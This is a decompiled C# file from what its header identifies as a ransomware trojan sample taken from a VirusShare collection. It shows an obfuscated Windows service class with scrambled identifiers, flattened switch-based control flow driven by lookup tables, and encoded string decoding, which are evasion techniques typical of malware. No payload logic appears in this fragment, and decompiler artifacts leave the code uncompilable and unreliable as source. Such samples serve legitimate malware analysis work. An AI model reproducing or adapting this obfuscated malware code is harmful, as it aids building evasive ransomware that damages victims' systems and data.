// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႤႳ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႤႳ : ServiceBase
  {
    private ႤႳ.Ⴄ Ⴈ = new ႤႳ.Ⴄ();

    public ႤႳ() => this.Ⴈ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    internal static string Ⴐ() => ႷႨ.Ⴅ(ႷႳ.Ⴅ((string) null, 1114476732, 4, (byte) 24));

    protected override void Dispose([In] bool obj0)
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 1:
          case 4:
            goto label_5;
          case 3:
            goto label_4;
          case 5:
            goto label_6;
          case 6:
            num = this.Ⴈ.Ⴄ == null ? 4 : 3;
            continue;
          default:
            num = !obj0 ? (int) ⴗ[173] - 3452 : 6;
            continue;
        }
      }
label_6:
      return;
label_4:
      this.Ⴈ.Ⴄ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴈ()
    {
      this.Ⴈ.Ⴄ = (object) new Container() as IContainer;
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (\u003CModule\u003E), 9L, 0, 1951761635), (short) 308, 'Ŝ');
    }

    static ႤႳ() => ႳႣ.Ⴅ();

    internal static int Ⴗ<\u0021\u00210>(
      [In] \u0021\u00210 obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3,
      [In] char obj4,
      [In] int obj5)
      where \u0021\u00210 : Stream
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴐ = ႷႨ.Ⴐ;
label_3:
      int num1 = 0;
      int num2 = 7;
      int num3;
      int num4;
      int num5;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 9:
            goto label_3;
          case 2:
          case 10:
            goto label_12;
          case 3:
            num3 = obj0.Read(obj1, obj2, obj3);
            num2 = 5;
            continue;
          case 4:
            num2 = (int) ⴍ[152] - 229;
            continue;
          case 5:
            ++num1;
            num4 = 1230;
            num5 = 170;
            goto case 8;
          case 6:
            num3 = obj2;
            num2 = 5;
            continue;
          case 7:
            int num6;
            switch (((int) obj4 ^ obj5) - 15 ^ num1)
            {
              case 0:
                num6 = (int) ⴗ[74] - 62104;
                break;
              default:
                num6 = (int) ⴍ[169] / 7;
                break;
            }
            num2 = num6;
            continue;
          case 8:
            num2 = 615 < num4 / 2 - num5 ? (int) ⴐ[189] : (int) ⴐ[31] - 126;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႤႳ.Ⴗ);
            num2 = (int) ⴍ[79] - 104;
            continue;
        }
      }
label_12:
      return num3;
    }

    internal sealed class Ⴄ
    {
      internal IContainer Ⴄ;

      internal Ⴄ()
      {
      }
    }
  }
}
